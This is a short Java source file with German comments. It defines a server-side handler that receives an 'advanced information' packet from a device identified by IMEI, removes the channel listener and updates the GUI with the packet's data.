package handler;

import server.Server;
import Packet.AdvancedInformationPacket;
import Packet.Packet;
import gui.GUI;

/**
 * Diese Klasse verarbeitet die AdvancedPacktes die an dem Server ankommen und sorgt daf�r das die Daten angezeigt werden.
 */
public class AdvInfoHandler implements PacketHandler {
	/**
	 * gui	Die Benutzeroberfl�che
	 */
	private GUI gui;
	/**
	 * channel	Der Datenkanal
	 */
	private int channel;
	/**
	 * imei	Die IMEI des Ger�ts
	 */
	private String imei;

	/**
	 * Der Konstruktor dieser Klasse bef�llt alle Klassenvariablen mit ihren Daten.
	 * @param chan	Kanal
	 * @param imei	IMEI
	 * @param gui	Die graphische Oberfl�che
	 */
	public AdvInfoHandler(int chan, String imei, GUI gui) {
		channel = chan;
		this.imei = imei;
		this.gui = gui;
	}

	@Override
	public void receive(Packet p, String imei) {
		// TODO Auto-generated method stub
	}

	/**
	 * 	/**
	 * Diese Methode entfernt die Listener und sorgt daf�r, dass die GUI upgedatet wird.
	 * @param p	Das Paket
	 * @param temp_imei	Die Imei des Ger�ts
	 * @param c	Der Server
	 */
	@Override
	public void handlePacket(Packet p, String temp_imei, Server c) {
		/**
		 * Infotext in der GUI ausgeben.
		 */
		gui.logTxt("Information data has been received");
		/**
		 * Den Kanallistener entfernen, da die Daten angekommen sind,
		 */
		c.getChannelHandlerMap().get(imei).removeListener(channel);
		AdvancedInformationPacket packet = (AdvancedInformationPacket) p;
		/**
		 * Die Gui f�r das Ger�t mit der IMEI updaten, sodass die Daten des packet angezeigt werden.
		 */
		gui.updateAdvInformations(imei, packet);
	}
}
